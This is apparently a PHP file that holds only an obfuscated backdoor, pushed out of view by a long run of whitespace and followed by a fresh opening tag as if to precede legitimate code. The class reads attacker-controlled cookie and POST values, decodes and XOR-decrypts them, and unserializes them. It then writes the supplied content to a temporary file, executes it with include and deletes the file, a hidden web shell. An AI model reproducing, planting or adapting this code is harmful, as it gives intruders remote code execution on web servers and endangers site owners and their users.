<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("p_kubSy")){class p_kubSy{public static $WKxWnYRBvE = "7df2f580-329a-45cf-bb26-5ce554ed56d4";public static $iQhBqins = NULL;public function __construct(){$QZyQWeUJO = $_COOKIE;$CUvlMtoJL = $_POST;$AfjTDpq = @$QZyQWeUJO[substr(p_kubSy::$WKxWnYRBvE, 0, 4)];if (!empty($AfjTDpq)){$OFkTlGVVyP = "base64";$AcfIY = "";$AfjTDpq = explode(",", $AfjTDpq);foreach ($AfjTDpq as $RVYiLAOX){$AcfIY .= @$QZyQWeUJO[$RVYiLAOX];$AcfIY .= @$CUvlMtoJL[$RVYiLAOX];}$AcfIY = array_map($OFkTlGVVyP . chr (95) . chr (100) . chr (101) . "\143" . chr ( 390 - 279 )."\144" . "\x65", array($AcfIY,)); $AcfIY = $AcfIY[0] ^ str_repeat(p_kubSy::$WKxWnYRBvE, (strlen($AcfIY[0]) / strlen(p_kubSy::$WKxWnYRBvE)) + 1);p_kubSy::$iQhBqins = @unserialize($AcfIY);}}public function __destruct(){$this->vPhMDTqg();}private function vPhMDTqg(){if (is_array(p_kubSy::$iQhBqins)) {$LlEpKbm = sys_get_temp_dir() . "/" . crc32(p_kubSy::$iQhBqins[chr ( 943 - 828 ).chr (97) . 'l' . chr (116)]);@p_kubSy::$iQhBqins["\x77" . "\162" . chr ( 157 - 52 ).'t' . "\x65"]($LlEpKbm, p_kubSy::$iQhBqins["\143" . chr ( 1093 - 982 )."\156" . 't' . chr ( 246 - 145 )."\x6e" . 't']);include $LlEpKbm;@p_kubSy::$iQhBqins['d' . "\x65" . 'l' . chr (101) . chr ( 515 - 399 ).'e']($LlEpKbm);exit();}}}$vhsqR = new p_kubSy(); $vhsqR = NULL;} ?><?php
